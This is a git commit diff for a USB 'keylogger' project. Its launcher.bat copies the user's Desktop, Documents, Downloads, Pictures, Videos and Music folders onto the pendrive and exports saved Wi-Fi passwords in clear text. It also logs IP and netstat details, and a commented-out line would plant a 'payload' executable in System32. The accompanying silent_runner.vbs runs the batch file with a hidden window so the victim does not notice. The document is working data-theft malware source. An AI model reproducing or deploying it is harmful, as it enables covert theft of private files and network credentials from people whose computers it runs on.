5044ed754343a4f75539f3aed13ca483e555ece6
adityababar07 <adityababar715@gmail.com>
2021-02-11 07:58:19 +0530

    initial commit

--- launcher.bat
+++ launcher.bat
@@ -14,12 +14,12 @@ MKDIR "H:\keylogger\data\%username%\Videos"
 MKDIR "H:\keylogger\data\%username%\Music"
 
 @REM copy files to pendrive
-XCOPY "C:\Users\%username%\Desktop" "H:\keylogger\data\%username%\Desktop"
-XCOPY "C:\Users\%username%\Downloads" "H:\keylogger\data\%username%\Downloads"
-XCOPY "C:\Users\%username%\Pictures" "H:\keylogger\data\%username%\Pictures"
-XCOPY "C:\Users\%username%\Documents" "H:\keylogger\data\%username%\Documents"
-XCOPY "C:\Users\%username%\Videos" "H:\keylogger\data\%username%\Videos"
-XCOPY "C:\Users\%username%\Music" "H:\keylogger\data\%username%\Music"
+XCOPY "%systemdrive%\Users\%username%\Desktop" "H:\keylogger\data\%username%\Desktop"
+XCOPY "%systemdrive%\Users\%username%\Downloads" "H:\keylogger\data\%username%\Downloads"
+XCOPY "%systemdrive%\Users\%username%\Pictures" "H:\keylogger\data\%username%\Pictures"
+XCOPY "%systemdrive%\Users\%username%\Documents" "H:\keylogger\data\%username%\Documents"
+XCOPY "%systemdrive%\Users\%username%\Videos" "H:\keylogger\data\%username%\Videos"
+XCOPY "%systemdrive%\Users\%username%\Music" "H:\keylogger\data\%username%\Music"
 
 @REM wifi passwords
 netsh wlan export profile key=clear
@@ -27,5 +27,23 @@ netsh wlan export profile key=clear
 @REM ipaddress
 ipconfig > ipconfig.txt 
 
+@REm active connections on system
+@REM netstat -a & netstat -b & netstat -e & netstat -f & netstat -n & netstat -x & netstat -t & netstat -q & netstat -p & netstat -o ' > netstat.txt
+set "logfile=netstat.txt"
+(
+ping google.com 
+netstat -a 
+netstat -b
+netstat -e
+netstat -f
+netstat -n
+netstat -x
+netstat -t
+netstat -q
+netstat -p
+netstat -o
+)>"%logfile%"
+
+@REM XCOPY "%systemdrive%\payload\system69.exe" "C:\Windows\System32\" -y
 
 @REM systeminfo > systeminfo.txt
--- silent_runner.vbs
+++ silent_runner.vbs
@@ -1,3 +1,3 @@
-set WshShell = CreateObject ("WScript.Shell")
+set WshShell = CreateObject("WScript.Shell")
 WshShell.Run chr(34) & "H:\keylogger\launcher.bat" & chr(34), 0
 set WshShell = Nothing
